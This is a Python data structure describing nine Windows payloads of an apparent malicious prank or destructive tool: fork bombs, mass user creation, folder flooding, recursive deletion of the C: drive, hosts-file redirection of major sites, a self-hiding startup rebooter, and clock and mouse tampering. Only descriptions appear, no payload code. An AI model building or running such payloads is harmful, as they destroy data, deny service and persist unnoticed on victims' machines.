long_description = {1 : {
					"name" : "fork bomb",
					"admin" : False,
					"description" : """The fork bomb is the equivalent of a DDoS attack on the system. It aims to deprive the system of memory (RAM), leaving nothing for other applications or the operating system's vital operations required to keep the systems running, hence crashing it. It pipes itself into itself, thus creating as many instances as it can"""  
					},
					2 : {
					"name" : "user bomb",
					"admin" : True,
					"description" : """The user bomb creates as many system users as it can.Name of each user: 'user<random_number>', password of each user: 'YEAHbro@123' """
					},
					3 : {
					"name" : "folder bomb",
					"admin" : False,
					"description" : """The folder bomb creates as many folders as it can on the current user's desktop.Name of each folder: 'folder<random_number>' """
					},
					4 : {
					"name" : "C: destroyer",
					"admin" : True,
					"description" : """The C: destroyer deletes recursively every single file that there is in the C: drive. Makes system permanently unusable"""
					},
					5 : {
					"name" : "dns poisoner",
					"admin" : True,
					"description" : """DNS poisoner makes these famous websites unreachable: facebook,google,twitter,instagram,youtube. It appends new entries to C:\\Windows\\system32\\drivers\\etc\\hosts which point to localhost,127.0.0.1"""
					},
					6 : {
					"name" : "persistent rebooter",
					"admin" : False,
					"description" : """Persistent rebooter forces the system to reboot each time the user logs in. It achieves this by copying itself into the startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. It also hides itself using attrib.exe """
					},
					7 : {
					"name" : "time changer",
					"admin" : True,
					"description" : """Time changer changes system's time to be 00:01"""
					},
					8 : {
					"name" : "mouse swapper",
					"admin" : False,
					"description" : """Mouse swapper swaps the usage of right and left click of the mouse"""
					},
					9 : {
					"name" : "fork bomb v2",
					"admin" : False,
					"description" : """The same as the fork bomb, but instead of the .bat file calling endlessly itself, notepad.exe,cmd.exe and powershell.exe are constantly spawned"""
					}
	}